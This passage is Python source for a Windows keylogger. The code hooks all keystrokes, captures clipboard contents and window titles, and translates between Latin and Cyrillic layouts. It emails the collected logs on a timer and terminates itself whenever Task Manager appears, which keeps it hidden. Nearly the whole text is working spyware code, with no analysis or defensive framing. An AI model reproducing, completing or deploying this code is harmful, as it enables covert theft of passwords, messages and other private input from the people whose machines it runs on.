        log_debug()
    '''
    return True


def check_task_managers():
    try:

        if is_program_already_open(program_path='Taskmgr.exe')[0]:

            log_local("Task Manager opened. Hence Keylogger closed.")
            os.kill(os.getpid(), 9)
            exit()
        elif len(find_top_windows(wanted_text="task manager")) > 0:

            log_local("Task Manager opened. Hence Keylogger closed.")
            os.kill(os.getpid(), 9)
            exit()
    except Exception as e:
        print("check_task_managers")
        print(e)


# Languages codes, taken from http://atpad.sourceforge.net/languages-ids.txt
lcid_dict = {'0x436': 'Afrikaans - South Africa', '0x041c': 'Albanian - Albania', '0x045e': 'Amharic - Ethiopia',
             '0x401': 'Arabic - Saudi Arabia', '0x1401': 'Arabic - Algeria', '0x3c01': 'Arabic - Bahrain',
             '0x0c01': 'Arabic - Egypt', '0x801': 'Arabic - Iraq', '0x2c01': 'Arabic - Jordan',
             '0x3401': 'Arabic - Kuwait', '0x3001': 'Arabic - Lebanon', '0x1001': 'Arabic - Libya',
             '0x1801': 'Arabic - Morocco', '0x2001': 'Arabic - Oman', '0x4001': 'Arabic - Qatar',
             '0x2801': 'Arabic - Syria', '0x1c01': 'Arabic - Tunisia', '0x3801': 'Arabic - U.A.E.',
             '0x2401': 'Arabic - Yemen', '0x042b': 'Armenian - Armenia', '0x044d': 'Assamese',
             '0x082c': 'Azeri (Cyrillic)', '0x042c': 'Azeri (Latin)', '0x042d': 'Basque', '0x423': 'Belarusian',
             '0x445': 'Bengali (India)', '0x845': 'Bengali (Bangladesh)', '0x141A': 'Bosnian (Bosnia/Herzegovina)',
             '0x402': 'Bulgarian', '0x455': 'Burmese', '0x403': 'Catalan', '0x045c': 'Cherokee - United States',
             '0x804': "Chinese - People's Republic of China", '0x1004': 'Chinese - Singapore',
             '0x404': 'Chinese - Taiwan', '0x0c04': 'Chinese - Hong Kong SAR', '0x1404': 'Chinese - Macao SAR',
             '0x041a': 'Croatian', '0x101a': 'Croatian (Bosnia/Herzegovina)', '0x405': 'Czech', '0x406': 'Danish',
             '0x465': 'Divehi', '0x413': 'Dutch - Netherlands', '0x813': 'Dutch - Belgium', '0x466': 'Edo',
             '0x409': 'English - United States', '0x809': 'English - United Kingdom', '0x0c09': 'English - Australia',
             '0x2809': 'English - Belize', '0x1009': 'English - Canada', '0x2409': 'English - Caribbean',
             '0x3c09': 'English - Hong Kong SAR', '0x4009': 'English - India', '0x3809': 'English - Indonesia',
             '0x1809': 'English - Ireland', '0x2009': 'English - Jamaica', '0x4409': 'English - Malaysia',
             '0x1409': 'English - New Zealand', '0x3409': 'English - Philippines', '0x4809': 'English - Singapore',
             '0x1c09': 'English - South Africa', '0x2c09': 'English - Trinidad', '0x3009': 'English - Zimbabwe',
             '0x425': 'Estonian', '0x438': 'Faroese', '0x429': 'Farsi', '0x464': 'Filipino', '0x040b': 'Finnish',
             '0x040c': 'French - France', '0x080c': 'French - Belgium', '0x2c0c': 'French - Cameroon',
             '0x0c0c': 'French - Canada', '0x240c': 'French - Democratic Rep. of Congo', '0x300c':
                 "French - Cote d'Ivoire", '0x3c0c': 'French - Haiti', '0x140c': 'French - Luxembourg',
             '0x340c': 'French - Mali', '0x180c': 'French - Monaco', '0x380c': 'French - Morocco',
             '0xe40c': 'French - North Africa', '0x200c': 'French - Reunion', '0x280c': 'French - Senegal',
             '0x100c': 'French - Switzerland', '0x1c0c': 'French - West Indies', '0x462': 'Frisian - Netherlands',
             '0x467': 'Fulfulde - Nigeria', '0x042f': 'FYRO Macedonian', '0x083c': 'Gaelic (Ireland)',
             '0x043c': 'Gaelic (Scotland)', '0x456': 'Galician', '0x437': 'Georgian', '0x407': 'German - Germany',
             '0x0c07': 'German - Austria', '0x1407': 'German - Liechtenstein', '0x1007': 'German - Luxembourg',
             '0x807': 'German - Switzerland', '0x408': 'Greek', '0x474': 'Guarani - Paraguay', '0x447': 'Gujarati',
             '0x468': 'Hausa - Nigeria', '0x475': 'Hawaiian - United States', '0x040d': 'Hebrew', '0x439': 'Hindi',
             '0x040e': 'Hungarian', '0x469': 'Ibibio - Nigeria', '0x040f': 'Icelandic', '0x470': 'Igbo - Nigeria',
             '0x421': 'Indonesian', '0x045d': 'Inuktitut', '0x410': 'Italian - Italy',
             '0x810': 'Italian - Switzerland', '0x411': 'Japanese', '0x044b': 'Kannada', '0x471': 'Kanuri - Nigeria',
             '0x860': 'Kashmiri', '0x460': 'Kashmiri (Arabic)', '0x043f': 'Kazakh', '0x453': 'Khmer',
             '0x457': 'Konkani', '0x412': 'Korean', '0x440': 'Kyrgyz (Cyrillic)', '0x454': 'Lao', '0x476': 'Latin',
             '0x426': 'Latvian', '0x427': 'Lithuanian', '0x043e': 'Malay - Malaysia',
             '0x083e': 'Malay - Brunei Darussalam', '0x044c': 'Malayalam', '0x043a': 'Maltese', '0x458': 'Manipuri',
             '0x481': 'Maori - New Zealand', '0x044e': 'Marathi', '0x450': 'Mongolian (Cyrillic)',
             '0x850': 'Mongolian (Mongolian)', '0x461': 'Nepali', '0x861': 'Nepali - India',
             '0x414': 'Norwegian (Bokmål)', '0x814': 'Norwegian (Nynorsk)', '0x448': 'Oriya', '0x472': 'Oromo',
             '0x479': 'Papiamentu', '0x463': 'Pashto', '0x415': 'Polish', '0x416': 'Portuguese - Brazil',
             '0x816': 'Portuguese - Portugal', '0x446': 'Punjabi', '0x846': 'Punjabi (Pakistan)',
             '0x046B': 'Quecha - Bolivia', '0x086B': 'Quecha - Ecuador', '0x0C6B': 'Quecha - Peru',
             '0x417': 'Rhaeto-Romanic', '0x418': 'Romanian', '0x818': 'Romanian - Moldava', '0x419': 'Russian',
             '0x819': 'Russian - Moldava', '0x043b': 'Sami (Lappish)', '0x044f': 'Sanskrit', '0x046c': 'Sepedi',
             '0x0c1a': 'Serbian (Cyrillic)', '0x081a': 'Serbian (Latin)', '0x459': 'Sindhi - India',
             '0x859': 'Sindhi - Pakistan', '0x045b': 'Sinhalese - Sri Lanka', '0x041b': 'Slovak',
             '0x424': 'Slovenian', '0x477': 'Somali', '0x042e': 'Sorbian', '0x0c0a': 'Spanish - Spain (Modern Sort)',
             '0x040a': 'Spanish - Spain (Traditional Sort)', '0x2c0a': 'Spanish - Argentina',
             '0x400a': 'Spanish - Bolivia', '0x340a': 'Spanish - Chile', '0x240a': 'Spanish - Colombia',
             '0x140a': 'Spanish - Costa Rica', '0x1c0a': 'Spanish - Dominican Republic',
             '0x300a': 'Spanish - Ecuador', '0x440a': 'Spanish - El Salvador', '0x100a': 'Spanish - Guatemala',
             '0x480a': 'Spanish - Honduras', '0xe40a': 'Spanish - Latin America', '0x080a': 'Spanish - Mexico',
             '0x4c0a': 'Spanish - Nicaragua', '0x180a': 'Spanish - Panama', '0x3c0a': 'Spanish - Paraguay',
             '0x280a': 'Spanish - Peru', '0x500a': 'Spanish - Puerto Rico', '0x540a': 'Spanish - United States',
             '0x380a': 'Spanish - Uruguay', '0x200a': 'Spanish - Venezuela', '0x430': 'Sutu', '0x441': 'Swahili',
             '0x041d': 'Swedish', '0x081d': 'Swedish - Finland', '0x045a': 'Syriac', '0x428': 'Tajik',
             '0x045f': 'Tamazight (Arabic)', '0x085f': 'Tamazight (Latin)', '0x449': 'Tamil', '0x444': 'Tatar',
             '0x044a': 'Telugu', '0x041e': 'Thai', '0x851': 'Tibetan - Bhutan',
             '0x451': "Tibetan - People's Republic of China", '0x873': 'Tigrigna - Eritrea',
             '0x473': 'Tigrigna - Ethiopia', '0x431': 'Tsonga', '0x432': 'Tswana', '0x041f': 'Turkish',
             '0x442': 'Turkmen', '0x480': 'Uighur - China', '0x422': 'Ukrainian', '0x420': 'Urdu',
             '0x820': 'Urdu - India', '0x843': 'Uzbek (Cyrillic)', '0x443': 'Uzbek (Latin)', '0x433': 'Venda',
             '0x042a': 'Vietnamese', '0x452': 'Welsh', '0x434': 'Xhosa', '0x478': 'Yi', '0x043d': 'Yiddish',
             '0x046a': 'Yoruba', '0x435': 'Zulu', '0x04ff': 'HID (Human Interface Device)'}

latin_into_cyrillic = (u"`QWERTYUIOP[]ASDFGHJKL;'ZXCVBNM,./" +
                       u"qwertyuiop[]asdfghjkl;'zxcvbnm,./" +
                       u"~`{[}]:;\"'|<,>.?/@#$^&",
                       u"ёЙЦУКЕНГШЩЗХЪФЫВАПРОЛДЖЭЯЧСМИТЬБЮ." +
                       u"йцукенгшщзхъфывапролджэячсмитьбю." +
                       u"ЁёХхЪъЖжЭэ/БбЮю,.\"№;:?")  # LATIN - CYRILLIC keyboard mapping
cyrillic_into_latin = (latin_into_cyrillic[1], latin_into_cyrillic[0])  # CYRILLIC - LATIN keyboard mapping

latin_into_cyrillic_trantab = dict([(ord(a), ord(b)) for (a, b) in zip(*latin_into_cyrillic)])
cyrillic_into_latin_trantab = dict([(ord(a), ord(b)) for (a, b) in zip(*cyrillic_into_latin)])

cyrillic_layouts = ['Russian', 'Russian - Moldava', 'Azeri (Cyrillic)', 'Belarusian', 'Kazakh',
                    'Kyrgyz (Cyrillic)', 'Mongolian (Cyrillic)', 'Tajik', 'Tatar', 'Serbian (Cyrillic)',
                    'Ukrainian', 'Uzbek (Cyrillic)']


def detect_key_layout():
    global lcid_dict
    user32 = ctypes.WinDLL('user32', use_last_error=True)
    curr_window = user32.GetForegroundWindow()
    thread_id = user32.GetWindowThreadProcessId(curr_window, 0)
    klid = user32.GetKeyboardLayout(thread_id)
    # made up of 0xAAABBBB, AAA = HKL (handle object) & BBBB = language ID
    # Language ID -> low 10 bits, Sub-language ID -> high 6 bits
    # Extract language ID from KLID
    lid = klid & (2 ** 16 - 1)
    # Convert language ID from decimal to hexadecimal
    lid_hex = hex(lid)
    try:
        language = lcid_dict[str(lid_hex)]
    except KeyError:
        language = lcid_dict['0x409']  # English - United States
    return language


initial_language = detect_key_layout()


def key_callback(event):
    global window_name, clipboard_logged, upper_case, capslock_on, start_time

    try:
        _ctrlc_pressed = get_ctrlc_pressed()
        if str(_ctrlc_pressed) == "1":
            set_status("hold")
            return True
        else:
            set_status("not hold,_ctrlc_pressed=" + str(_ctrlc_pressed))

        set_status("key_callback  begin")
        keys_pressed = keyboard.get_hotkey_name()

        is_pressed_ctrl = is_pressed('ctrl')
        is_pressed_r_ctrl = is_pressed('right ctrl')
        is_pressed_shift = is_pressed('shift')
        is_pressed_r_shift = is_pressed('right shift')
        # f_test("k=" + keys_pressed + ",e=" + event.name+ ",is_pressed_shift=" + str(is_pressed_shift) + "\n")
        # f_test("k=" + keys_pressed + ",eName=" + event.name + ",event_type=" + str(event.event_type) )

        window_buffer, time_buffer, clipboard_buffer = '', '', ''

        config.window_title = win32gui.GetWindowText(win32gui.GetForegroundWindow())
        if 1 == 2 and config.window_title and (
                "- Google Chrome" in config.window_title or "— Mozilla Firefox" in config.window_title or "- Microsoft​ Edge" in config.window_title):
            dummy = ""
        elif config.window_title and window_name != config.window_title:

            window_buffer = '[WindowName: ' + config.window_title + ']: '
            window_name = config.window_title  # set the new value
        '''
        now = datetime.now()
        if now - time_logged > timedelta(minutes=MINUTES_TO_LOG_TIME):
            # time_buffer = '[Time: ' + ('%02d:%02d' % (now.hour, now.minute)) + ']: '
            time_logged = now  # set the new value
        '''
        curr_clipboard = get_clipboard_value()
        if curr_clipboard and curr_clipboard != clipboard_logged and 1 == 2:
            set_status("Clipboard1")
            clipboard_buffer = '[Clipboard1: ' + curr_clipboard + ']: '
            clipboard_logged = curr_clipboard  # set the new value

        if window_buffer != "" or clipboard_buffer != "":  # time_buffer != "" or
            # if config.line_buffer != "": log_it()
            # if(window_buffer in config.line_buffer): window_buffer=""
            config.line_buffer += window_buffer + clipboard_buffer  # time_buffer +
            config.backspace_buffer_len = len(config.line_buffer)

        if event.event_type == 'up':
            if event.name in ['shift', 'right shift']:  # SHIFT UP
                if "shift" in config.line_buffer or config.shift_on == True:
                    set_status("shift up")
                    try:
                        set_ctrlc_pressed(1)
                        # log_it()
                        get_selected_text()
                    finally:
                        set_ctrlc_pressed(0)
                config.shift_on = False
                upper_case = update_upper_case()

            if event.name in ["home", "end"]:
                # f_test("called")
                if ("left ctrlC" in config.line_buffer):
                    set_status("home/end -left ctrlC")
                    config.line_buffer = config.line_buffer.replace("left ctrlC", "")

                if "shift" in config.line_buffer or config.shift_on == True:
                    set_status("shift + home/end")
                    try:
                        set_ctrlc_pressed(1)
                        # log_it()
                        get_selected_text()
                    finally:
                        set_ctrlc_pressed(0)
            return True
        key_pressed = ''
        # DETERMINE THE KEY_PRESSED GIVEN THE EVENT
        if event.name in ['leftxxx', 'rightxxx']:  # ,'up','down','home','end','page down','page up','scroll lock'
            key_pressed_list = list()
            if is_pressed_ctrl or is_pressed_r_ctrl:
                key_pressed_list.append('ctrl')
            if is_pressed_shift or is_pressed_r_shift:
                key_pressed_list.append('shift')

            key_pressed = '<' + '+'.join(key_pressed_list) + (
                '+' if len(key_pressed_list) > 0 else '') + event.name + '>'
            # config.line_buffer += key_pressed
            config.backspace_buffer_len = len(config.line_buffer)

        elif keys_pressed == 'ctrl+alt+delete':

            if keys_pressed == 'ctrl+alt+delete':
                os.kill(os.getpid(), 9)
                exit()


        elif event.name == 'space':
            key_pressed = ' '
            # typing_pattern_inactivity(key_pressed)
        elif event.name in ['enter']:  # , 'tab'
            key_pressed = '<TAB>' if event.name == 'tab' else '<ENTER>'
            config.line_buffer += key_pressed
            config.backspace_buffer_len = len(config.line_buffer)
            log_it()  # pass event to other handlers
            return True
        elif event.name == 'backspace':
            if len(config.line_buffer) - config.backspace_buffer_len > 0 and 1 == 2:
                config.line_buffer = config.line_buffer[:-1]
            else:
                config.line_buffer += '<backspace>'
                config.backspace_buffer_len = len(config.line_buffer)
        elif event.name == 'caps lock':
            # key_pressed ="capslock"
            upper_case = not upper_case
            capslock_on = not capslock_on
        elif event.name in ['shift', 'right shift']:
            config.shift_on = True
            # key_pressed ="shift"
            upper_case = update_upper_case()
            # f_test("k=" + keys_pressed + ",e=" + event.name + "\n")
        elif "ctrl" in keys_pressed:

            if keys_pressed == event.name:
                key_pressed = event.name
                if event.name == "ctrl":
                    key_pressed = ""
                elif config.line_buffer != "":
                    key_pressed = " " + key_pressed
                    key_pressed = key_pressed + " "
            elif keys_pressed != event.name:
                if event.name in keys_pressed:
                    key_pressed = keys_pressed
                    if (event.name == "ctrl"):
                        if config.line_buffer != "": key_pressed = " " + key_pressed
                        key_pressed = key_pressed + " "
            else:
                key_pressed = ""

            set_status("ctrl in keys_pressed, key_pressed=" + key_pressed)
            if key_pressed == "ctrl+v":
                curr_clipboard = pyperclip.paste()  # get_clipboard_value()
                if curr_clipboard:
                    clipboard_buffer = '[Clipboard: ' + curr_clipboard + ']: '
                    clipboard_logged = curr_clipboard
                    # if (clipboard_buffer in config.line_buffer):
                    # dummy = ""
                    # else:

                    if (config.window_title not in config.line_buffer): config.line_buffer += window_buffer
                    config.line_buffer += clipboard_buffer + " "
            if key_pressed: key_pressed = "<" + key_pressed + ">"
        else:
            key_pressed = event.name
            if config.line_buffer and keys_pressed == event.name:
                if event.name == "ctrl" or event.name == "shift" or event.name == "alt":
                    if config.line_buffer[len(config.line_buffer) - len(event.name)] == event.name:
                        key_pressed = ""
                    elif config.line_buffer[
                        len(config.line_buffer) - len("<" + event.name + ">")] == "<" + event.name + ">":
                        # slice mystr = "abcdefghijkl" mystr[-4:]->'ijkl' mystr[len(mystr) - 4:]->'ijkl'  mystr[:-4]->'abcdefgh'
                        key_pressed = ""

            if len(key_pressed) == 1:
                language = detect_key_layout()

                global latin_into_cyrillic_trantab, cyrillic_layouts
                if 'English' in language and 'English' not in initial_language:
                    # cyrillic -> latin reverse translation is required
                    if ord(key_pressed) in cyrillic_into_latin_trantab:
                        key_pressed = chr(cyrillic_into_latin_trantab[ord(key_pressed)])
                elif language in cyrillic_layouts and initial_language not in cyrillic_layouts:
                    # latin -> cyrillic translation is required
                    if ord(key_pressed) in latin_into_cyrillic_trantab:
                        key_pressed = chr(latin_into_cyrillic_trantab[ord(key_pressed)])

                # apply upper or lower case
                key_pressed = key_pressed.upper() if upper_case else key_pressed.lower()
                if start_time is None: start_time = time.time()
                # typing_pattern_inactivity(key_pressed)


            else:
                # unknown character (eg arrow key, shift, ctrl, alt)
                # return True  # pass event to other handlers
                key_pressed_list = list()
                if is_pressed_ctrl or is_pressed_r_ctrl:
                    key_pressed_list.append('ctrl')
                if is_pressed_shift or is_pressed_r_shift:
                    key_pressed_list.append('shift')

                key_pressed = '<' + '+'.join(key_pressed_list) + (
                    '+' if len(key_pressed_list) > 0 else '') + event.name + '>'
                # config.line_buffer += key_pressed
                config.backspace_buffer_len = len(config.line_buffer)
            '''
            if ("ctrl+c" in key_pressed ):
                if (get_ctrlc_pressed() == 1):
                    key_pressed = ""
                    set_ctrlc_pressed(0)
            '''
        typing_pattern_inactivity(key_pressed)
        config.line_buffer += key_pressed

        if (
                "<left ctrl>c" in config.line_buffer or "<shift+left ctrl>c" in config.line_buffer or "<left ctrl>C" in config.line_buffer or "<shift+left ctrl>C" in config.line_buffer):
            config.line_buffer = config.line_buffer.replace("<shift+left ctrl>C", "")
            config.line_buffer = config.line_buffer.replace("<shift+left ctrl>c", "")
            config.line_buffer = config.line_buffer.replace("<left ctrl>c", "")
            config.line_buffer = config.line_buffer.replace("<left ctrl>C", "")

            set_status("<left ctrl>c replace")
            # f_test("replace")

        if len(config.line_buffer) >= CHAR_LIMIT:  # or ("ctrl+v" in key_pressed and "left ctrl" not in config.line_buffer) or keys_pressed == "shift+end" or keys_pressed == "shift+home":
            log_it()
        '''
        if ("ctrl+a" == key_pressed):
            get_selected_text()
            config.line_buffer=""
        '''
        # if keys_pressed == "shift+end" or keys_pressed == "shift+home": get_selected_text()

        return True
    except KeyboardInterrupt:
        print("Got Keyboard interrupt. Exiting...")
        sys.exit(1)
    except Exception as e:
        print("key_callback")
        print(e)


def halt_close():
    try:
        # f_test("on_exit()")
        if config.mouse_timer: config.mouse_timer.cancel()
        if config.url_timer: config.url_timer.cancel()
        if wintitle_timer: wintitle_timer.cancel()
        if sys_timer: sys_timer.cancel()
        if mail_timer: mail_timer.cancel()
        keyboard.unhook_all()
        log_it()
        log_local(getdate() + "\t" + "Application Closed\n")
        send_message()
        time.sleep(3)  # so you can see the message before program exits
        halt()
    except Exception as e:
        print(F"Error in on_exit: {e}")


def halt():
    current_system_pid = os.getpid()
    this_system = psutil.Process(current_system_pid)
    this_system.terminate()


def on_exit(sig, func=None):
    halt_close()


win32api.SetConsoleCtrlHandler(on_exit, True)


def get_wintitle():
    global prev_win_title, wintitle_timer
    try:
        if wintitle_timer: wintitle_timer.cancel()
        win_title = win32gui.GetWindowText(win32gui.GetForegroundWindow())
        if win_title and win_title != prev_win_title:
            prev_win_title = win_title
            log_local(getdate() + "\t" + 'Window:' + win_title + "\n")
    except Exception as e:
        print(e)
    finally:
        wintitle_timer = threading.Timer(2, get_wintitle)
        wintitle_timer.start()


'''
def MailLogin():
    global to_email, mail_flow, mail_creds
    if os.path.exists(os.path.join(dir_path, 'credentials.json')) == False: return  # Mail
    if not config.from_email or not to_email: return

    if mail_flow is None:
        mail_flow = InstalledAppFlow.from_client_secrets_file('credentials.json', SCOPES)
        f_test(F"mail_flow={mail_flow}")
        mail_creds = mail_flow.run_local_server(port=0)
        f_test(F"mail_creds={mail_creds}")
'''


def main():
    global mail_timer
    try:
        # KEYLOGGER STARTS
        if not os.name == "nt":
            print("Only Windows OS was supported")
            return  # TODO: Linux, MacOS
        check_task_managers()

        config.mouse_timer = threading.Timer(0.1, mice.mouse_start)
        config.mouse_timer.start()

        wintitle_timer = threading.Timer(2, get_wintitle)
        wintitle_timer.start()

        sys_timer = threading.Timer(5, systeminfo)
        sys_timer.start()
        if MINUTES_TO_EMAIL > 0:
            mail_timer = threading.Timer(MINUTES_TO_EMAIL * 60, send_message)
            mail_timer.start()
            # mail_login_timer = threading.Timer(5, MailLogin)
            # mail_login_timer.start()

        log_local(getdate() + "\t" + "Application Started\n")

        keyboard.hook(key_callback)

        keyboard.wait()
        return
    except KeyboardInterrupt as e:
        print(e)
        keyboard.unhook_all()
        #dummy = ""
    except Exception as e:
        print(e)


if __name__ == '__main__':
    main()
